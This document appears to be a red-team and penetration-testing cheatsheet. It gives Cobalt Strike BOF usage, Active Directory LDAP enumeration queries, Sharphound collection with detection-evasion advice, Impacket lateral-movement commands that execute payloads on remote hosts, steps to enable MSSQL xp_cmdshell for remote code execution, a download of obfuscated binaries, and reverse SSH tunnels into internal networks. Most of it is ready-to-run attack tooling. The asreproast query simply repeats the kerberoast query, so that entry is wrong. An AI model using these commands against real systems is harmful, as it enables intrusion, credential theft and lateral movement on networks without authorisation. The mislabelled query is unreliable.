# Red Teaming and Penetration Testing Checklist, Cheatsheet, Clickscript

Not a definitive list, cheatsheet, or opsec safe by any means, just things of note.... 

Several enumeration techniques are picked up by defenses *(including sharphound collectors)*, especially LDAP queries with asteriks like `attribute=*`. Iterative lookups are usually better, if you know what I mean.

## C2 Redirectors
- [bigb0ss's C2 Redirector — Cloud Fronting Setup (AWS)](https://bigb0ss.medium.com/redteam-c2-redirector-cloud-fronting-setup-aws-e7ed561a3a6c)
- [bigb0ss's C2 Redirector — Domain Fronting Setup (Azure)](https://bigb0ss.medium.com/redteam-c2-redirector-domain-fronting-setup-azure-adbedbd28305)

## Must-Have BOFs:
 - [TrustedSec's Situational Awareness BOFs](https://github.com/trustedsec/CS-Situational-Awareness-BOF)
 - [TrustedSec's Remote Operations BOFs](https://github.com/trustedsec/CS-Remote-OPs-BOF)
 - [ajpc500's BOFs](https://github.com/ajpc500/BOFs)
 - [Raphael Mudge's Unhook BOF](https://github.com/rsmudge/unhook-bof)
 - [EncodeGroup's SAM - SYSTEM - SECURITY Dump BOF](https://github.com/EncodeGroup/BOF-RegSave)
 - [rookuu's MiniDumpWriteDump BOF](https://github.com/rookuu/BOFs/)

## C2 Command Cheatsheets (Cobaltstrike + Sliver):
 - [Will Summerhill's useful Cobalt Strike & Sliver techniques learned from engagements](https://github.com/wsummerhill/C2_RedTeam_CheatSheets)

## Roxana Kovaci's Obfucated BINs:
 - [Obfucated BINs using Azure Pipelines](https://github.com/RoxanaKovaci/Azure-pipelines/)
   - `wget https://github.com/RoxanaKovaci/Azure-pipelines/releases/download/Obfuscated/Obfuscated.zip && unzip -o Obfuscated.zip && cat correlation.txt`

## Execute-Assembly through BOF:
All assemblies should be run through [BOF.NET](https://github.com/CCob/BOF.NET). 

In Beacon terminal:

1. `bofnet_init`
2. `bofent_load /Path/To/Assembly.exe`
3. `bofnet_executeassembly ASSEMBLYNAME -arg1 VALUE -arg2 VALUE`

## External Recon Checklist *(Essentials)*
1. OSINT *(Passive)*
    - Whois company, what do they do or specialize in
    - Find out what the company atmosphere is like *(use company review sites like [Glassdoor](https://www.glassdoor.com/))*
    - ASN Lookups
    - DNS Recon *([amass](https://github.com/OWASP/Amass), [subfinder](https://github.com/projectdiscovery/subfinder), [crt.sh](https://crt.sh),[certspotter](https://certspotter.com) DNS Zone transfers, etc)*, including MX/SPF etc
    - [Shodan](https://www.shodan.io/)
    - Company email format *(first.last, flast, etc -> find on [hunter.io](https://hunter.io/))*
    - Code repository recon *(github, gitlab, bitbucket, etc)* using [truffleHog](https://github.com/trufflesecurity/truffleHog), [git-secrets](https://github.com/awslabs/git-secrets), etc
    - Perform AWS bucket and/or Azure blob enumeration using tools such as [MicroBurst](https://github.com/NetSPI/MicroBurst) and [inSp3ctor](https://github.com/brianwarehime/inSp3ctor). 
    - Harvest employee names *(use [theHarvester](https://github.com/laramies/theHarvester) and/or [Linky](https://github.com/mez-0/linky) with keyword searches)* and curate list with company email format
        - *(Used for phishing and/or password spraying)*
2. *(Active)*
    - Nmap IPs/Domains for list of systems online and any open ports
    - Take note of any management ports externally accessible
    - Identify any web apps *([Eyewitness](https://github.com/FortyNorthSecurity/EyeWitness)/[Aquatone](https://github.com/michenriksen/aquatone))* 
        - *(Especially employee login portals to perform a password spray)*
    - Inspect web apps for comments or files hosted in amazon, azure, etc. 
    - Perform discovery of documents across live domains to extract MetaData from *([PyMeta](https://github.com/m8r0wn/pymeta), [PowerMeta](https://github.com/dafthack/PowerMeta), or [FOCA](https://github.com/ElevenPaths/FOCA))*


## Initial Access Recon
### LDAP Queries with `ldapsearch` Cobalt Strike BOF
---
Get Domain Controllers

`ldapsearch "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"`

Get all Domain Admins

`ldapsearch "(&(objectCategory=group)(name=Domain Admins))"`

Get Password Policy

`ldapsearch "(&(objectClass=msDS-PasswordSettings))"`

Get specific User

`ldapsearch "(&(objectCategory=person)(objectClass=user)(samaccountname=TARGETUSERNAME))"`

Get specific Computer

`ldapsearch "(&(objectCategory=Computer)(name=TARGETCOMPUTERNAME))"`

Get all Groups

`ldapsearch "(&(objectClass=group))"`

Get all active *(not disabled)* Users

`ldapsearch "(&(objectCategory=person)(objectClass=user)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"`

Get all active *(not disabled)* Computers

`ldapsearch "(&(objectCategory=Computer)(!userAccountControl:1.2.840.113556.1.4.803:=2))"`

Get *(not disabled)* accounts with SPN set for kerberoasting

`ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"`

Get *(not disabled)* accounts that do not require PREAUTH for asreproasting

`ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"`

Get Windows Servers

`ldapsearch "(&(&(&(&(samAccountType=805306369)(!(primaryGroupId=516)))(objectCategory=computer)(operatingSystem=Windows Server*))))"`

Get Users with `passnotreq` set

`ldapsearch "(&(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=32))"`

All users with `Password Never Expires` set

`ldapsearch "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"`

Others:

*https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx*

### Use [bofhound](https://github.com/fortalice/bofhound) to generate bloodhound json data

First, run the above [ldap queries](#ldap-queries-with-ldapsearch-cobalt-strike-bof) (_as necessary_) and THEN the following `ldapsearch`'s:

`ldapsearch "(objectClass=domain)" DC=TARGET,DC=DOMAIN`

`ldapsearch "(schemaIDGUID=*)" name,schemaidguid -1 "" CN=Schema,CN=Configuration,DC=TARGET,DC=DOMAIN`

`ldapsearch (name=ms-mcs-admpwd) name,schemaidguid 1 "" CN=Schema,CN=Configuration,DC=TARGET,DC=DOMAIN`

Run [bofhound](https://github.com/fortalice/bofhound) on the Cobalt Strike logs to create the json data.


### Localhost Enumeration Examples with [Seatbelt.exe](https://github.com/GhostPack/Seatbelt)
---
`bofnet_load /path/to/Seatbelt.exe`

`bofnet_executeassembly Seatbelt -group=user`

`bofnet_executeassembly Seatbelt -group=system`

`bofnet_executeassembly Seatbelt -group=all -full`

### [Sharphound](https://github.com/BloodHoundAD/SharpHound3) Collection Methods for [BloodHound](https://github.com/BloodHoundAD/BloodHound)
---

WARNING: Sharphound's queries are heavily signatured (_even through proxy_), run at your own risk. Try [bofhound first](#use-bofhound-to-generate-bloodhound-json-data).

`bofnet_load /path/to/sharphound.exe`

Run the following methods one at a time, mix up the order as desired:

`bofnet_executeassembly Sharphound --CollectionMethods Group --Domain TARGETDOMAIN --Memcache --RandomFilenames`

`bofnet_executeassembly Sharphound --CollectionMethods Trusts --Domain TARGETDOMAIN --Memcache --RandomFilenames`

`bofnet_executeassembly Sharphound --CollectionMethods ACL --Domain TARGETDOMAIN --Memcache --RandomFilenames`

`bofnet_executeassembly Sharphound --CollectionMethods ObjectProps --Domain TARGETDOMAIN --Memcache --RandomFilenames`

`bofnet_executeassembly Sharphound --CollectionMethods Container --Domain TARGETDOMAIN --Memcache --RandomFilenames`

`bofnet_executeassembly Sharphound --CollectionMethods GPOLocalGroup --Domain TARGETDOMAIN --Memcache --RandomFilenames`

If stuck and need to do Session and Localadmin collection, target specific systems of interest:

`bofnet_executeassembly Sharphound --CollectionMethods Session,LocalAdmin --Domain TARGETDOMAIN --ComputerFile c:\path\to\target\systems.list --Jitter 20 --Throttle 2000 --Memcache --RandomFilenames`

### Windows Share Enumeration
---
Hunt for sensitive files, scripts, and plaintext credentials in accessible shares. Speed it up (_can be loud_) by using this amazing tool: [Snaffler](https://github.com/SnaffCon/Snaffler) by [l0ss](https://github.com/l0ss). 

## Lateral Movement
### [Impacket](https://github.com/fortra/impacket) over SOCKS through Proxychains
---
Start SOCKS5 in a Cobaltstrike Beacon, add it into your local `/etc/proxychains4.conf` file

Get a TGT (using hash or plaintext)
 - `proxychains4 impacket-getTGT 'DOMAIN.COM/username:p@SsW0rD!'`

Upload payload to targethost
 - `proxychains4 impacket-smbclient 'DOMAIN.COM/username:'@targethostname.domain.com -no-pass -k`

Execute payload. Example of a few notable methods:

`impacket-wmiexec`
 - `proxychains4 impacket-wmiexec -nooutput -silentcommand -no-pass -k 'DOMAIN.COM/username:'@targethostname.domain.com 'C:\Windows\System32\cmd.exe /c C:\Path\To\Payload\maybe.exe'`

`impacket-dcomexec`
 - `proxychains4 impacket-dcomexec -object MMC20 -nooutput -silentcommand -no-pass -k 'DOMAIN.COM/username:'@targethostname.domain.com 'C:\Windows\System32\cmd.exe /c C:\Path\To\Payload\maybe.exe'`

`impacket-services`
 - `proxychains4 impacket-services 'DOMAIN.COM/username:'@targethostname.domain.com config -name ServiceName`
   - _Note down current config to change it back later_
 - `proxychains4 impacket-services 'DOMAIN.COM/username:'@targethostname.domain.com change -name ServiceName -path 'C:\windows\system32\cmd.exe /c C:\Path\To\Payload\maybe.exe'`
 - `proxychains4 impacket-services 'DOMAIN.COM/username:'@targethostname.domain.com start -name ServiceName`
 - `proxychains4 impacket-services 'DOMAIN.COM/username:'@targethostname.domain.com change -name ServiceName -path 'CHANGE BACK TO OLD CONFIG NOTED FROM EARLIER'`
   
### MoveKit
---
[MoveKit](https://github.com/0xthirteen/MoveKit) and the required two assemblies: [SharpRDP](https://github.com/0xthirteen/SharpRDP) + [SharpMove](https://github.com/0xthirteen/SharpMove).

Use `WMI` or the Service binpath modifcation technique *([SCShell](https://github.com/Mr-Un1k0d3r/SCShell) by [Mr-Un1k0d3r](https://twitter.com/MrUn1k0d3r))*

### MSSQL
---
Check if xp_cmdshell is enabled

`SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';`

Enable advanced options

`EXEC('sp_configure ''show advanced options'', 1; reconfigure;');`

Enable xp_cmdshell

`EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;');`

RCE

`exec master.sys.xp_cmdshell 'whoami'`

## Nmap
HVT ports for some quick wins on discovered subnets *(mostly when on an internal network)*
- Java RMI: `1090,1098,1099,4444,11099,47001,47002,10999`
- WebLogic: `7001-7004, 8000-8003,9000-9003,9503,7070,7071`
- JDWP: `45000,45001`
- JMX: `8686,9012,50500`
- GlassFish: `4848` 
- jBoss: `11111,4444,4445` 
- Cisco Smart Install: `4786` 
- HP Data Protector: `5555,5556`
- Apache Solr: `8983,8984`

## Misc
### Backup with Rsync
---
Backup CobaltStrike Logs

`rsync -avzh -e "ssh -i /path/to/private.ky" root@TEAMSERVER:/path/to/cobaltstrike/logs/ /path/to/local/destination/folder`

OR using your default `$HOME/.ssh/id_rsa`

`rsync -avzh -e "ssh" root@TEAMSERVER:/path/to/cobaltstrike/logs/ /path/to/local/destination/folder`

### SSH Tunnels
---
#### Access internal box:

Create a tunnel at externally accessible middlebox and back to Kali. Run from Kali *(on someones internal network maybe)*:

`ssh root@middlebox -R 2022:localhost:22`

Run on middlebox:

`ssh root@localhost -p 2022`

#### Steps to produce a multihop one-liner to get into Kali:

run on Kali:

`ssh root@middlebox -R 2022:localhost:22`

Run on your local system at home sitting behind firewall:

`ssh -t root@middlebox -L 2023:localhost:2022 ssh -p 2022 root@localhost`

BONUS: Access CobaltStrike or any other service running on Kali by running this on your local machine:

`ssh -L 50050:localhost:50050 -p2023 root@localhost`
